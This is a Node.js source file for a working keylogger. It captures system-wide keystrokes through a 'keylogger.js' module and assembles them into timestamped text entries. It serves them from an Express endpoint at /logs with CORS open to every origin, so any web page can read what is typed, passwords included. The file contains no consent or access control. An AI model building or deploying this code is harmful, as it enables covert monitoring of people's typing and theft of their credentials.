const keylogger = require('keylogger.js')
const express = require('express')
const cors = require('cors')
const app = express()
const port = 3000

const replacementTable = {
  Spacebar: ' ',
  Meta: 'cmd',
  Tab: ''
}

app.use(cors())
// let log = 'hej'
let log = []
let currentSentence = ''

const addLog = () => {
  if (currentSentence !== '') {
    log.unshift({ timestamp: new Date().toISOString(), text: currentSentence })
    currentSentence = ''
  }
}

let lastTypedTime = (new Date()).getTime()

app.get('/logs', (req, res) => {
  // res.send(log)
  res.json({ logs: log })
})

app.get('/clear', (req, res) => {
  log = []
  currentSentence = ''
  res.send(200)
})

app.listen(port, () => {
  console.log(`Example app listening at http://localhost:${port}`)
})

keylogger.start((key, isKeyUp, keyCode) => {
  // console.log('keyboard event', key, isKeyUp, keyCode)
  const now = (new Date()).getTime()
  if (now - lastTypedTime > 2000) {
    addLog(currentSentence)
  }
  lastTypedTime = now

  if (isKeyUp) {
    if (key === 'Tab' && currentSentence !== '') {
      addLog(currentSentence)
    }

    if (replacementTable[key] == null) {
      // if normal key input
      if (key === 'Backspace') {
        // Special case remove letter
        console.log('Removing stuff...')
        currentSentence = currentSentence.slice(0, -1)
      } else {
        // Normal case add letter
        currentSentence = currentSentence + key
      }
    } else {
      currentSentence = currentSentence + replacementTable[key]
    }
  }
})
